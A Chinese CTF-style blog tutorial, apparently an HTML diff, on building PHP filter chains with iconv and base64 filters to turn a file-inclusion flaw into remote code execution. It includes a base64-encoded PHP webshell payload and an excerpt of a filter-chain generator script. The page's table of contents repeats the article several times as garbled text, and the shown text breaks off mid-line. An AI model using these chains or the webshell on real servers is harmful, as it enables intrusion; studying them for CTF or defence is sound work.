+<p><strong>&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略</strong></p>
+<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/4.png" alt="4"></p>
+<p><strong>&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果</strong></p>
+<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/5.png" alt="5"></p>
+<h3>编码过滤器的特性</h3>
+
+<p><strong>过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,sunrt&quot;</span>);</span><br><span class="line"> </span><br><span class="line">运行结果:</span><br><span class="line">$)Csunrt </span><br></pre></td></tr></table></figure>
+
+<p><strong>我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Csunrt&quot;</span>));</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Csunrg==</span><br><span class="line">Csunrg==</span><br></pre></td></tr></table></figure>
+
+<p><strong>此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">÷å<span class="number">4</span>sunrt</span><br></pre></td></tr></table></figure>
+
+<p><strong>不出所料的话，添加base64过滤器后，就会向原始数据前面添加4</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">4</span>sunrg==</span><br></pre></td></tr></table></figure>
+
+<p><strong>那么，添加4C就可以这样做</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">4</span>Csunrg=</span><br></pre></td></tr></table></figure>
+
+<p><strong>只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符</strong></p>
+<p><strong>要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原</strong></p>
+<p><strong>比如我们想要构造<?=`$_GET[0]`;;?>，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了</strong></p>
+<h3>想要构造的字符哪里来</h3>
+
+<p><strong>第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：</strong><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main/res">字符的整理</a></p>
+<h3>用于梭哈的脚本以及脚本的分析</h3>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py">梭哈脚本</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可</strong></p>
+</h6></h6></h6></h6>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">通过php函数的分析解析php的filter链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">php-base64函数特性分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.1.</span> <span class="toc-text">所传参数位数为4*n+1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.2.</span> <span class="toc-text">所传参数位数为4*n+2
+
+
+此时运行相当于自动补全两个等号后解码
+所传参数位数为4*n+3
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.3.</span> <span class="toc-text">
+
+
+此时运行相当于自动补全两个等号后解码
+所传参数位数为4*n+3
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.4.</span> <span class="toc-text">所传参数位数为4*n+3
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.5.</span> <span class="toc-text">
+
+
+此时相当于自动补全一个等号后解码
+&lt;2&gt;base64解码时，会忽略其中的非字母数字+&#x2F;&#x3D;,其中对于不在末尾的等号，也会进行忽略
+
+&lt;3&gt;对于一个已经能够解码的字符串，在其后面无论加入多少字符，都不会影响该字符串的解码结果
+
+编码过滤器的特性
+
+过滤器的叠加组合，可以在原始字符前添加一些字符，我们来看下面的例子
+12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); 运行结果:$)Csunrt 
+
+我们发现，多了几个字符，但是，我们说过前面base64的特性，在解码时，会忽略掉非数字字符+&#x2F;&#x3D;，那如果我们添加base64decode过滤器，再添加base64encode过滤器，那么这些字符就会消失，只留下C字符
+12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));运行结果：Csunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;
+
+此时我们完成了一项任务，就是在已有的数据前面，再次添加别的字符，我们能看到，运行的结果稍稍改变了原有的字符，这不重要，因为改变的往往都是最后的字符，我们只要保证添加的字符不被改变就行，此时我们完成了一个字符的添加，这远远不够，一个字符改变不了任何东西，那么如何添加更多的字符呢，我们来看
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：÷å4sunrt
+
+不出所料的话，添加base64过滤器后，就会向原始数据前面添加4
+123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4sunrg&#x3D;&#x3D;
+
+那么，添加4C就可以这样做
+1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;运行结果：4Csunrg&#x3D;
+
+只需要简单的拼接，就能够添加多个字符，但是此时只能添加base64_decode函数认证的字符，也就是字母数字+&#x2F;&#x3D;，对我们来说限制还是很大，因为恶意代码肯定带有字符
+要解决这个问题，其实也很简单，就是我们构造一串恶意代码的base64编码值，那这个编码值，肯定是字母数字+&#x2F;&#x3D;，最后我们再次添加一个base64-decode过滤器，此时，恶意代码就会被还原
+比如我们想要构造，那么直接构造PD89YCRfR0VUWzBdYDs7Pz4&#x3D;即可，构造完成后，直接再次在构造的末尾添加|convert.base64-decode即可，此时恶意代码就会被解码，如果存在包含漏洞，那就可以RCE了
+想要构造的字符哪里来
+
+第一种当然是写脚本，慢慢尝试了，但是已经有人替我们整理好了：字符的整理
+用于梭哈的脚本以及脚本的分析
+
+梭哈脚本
+1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; 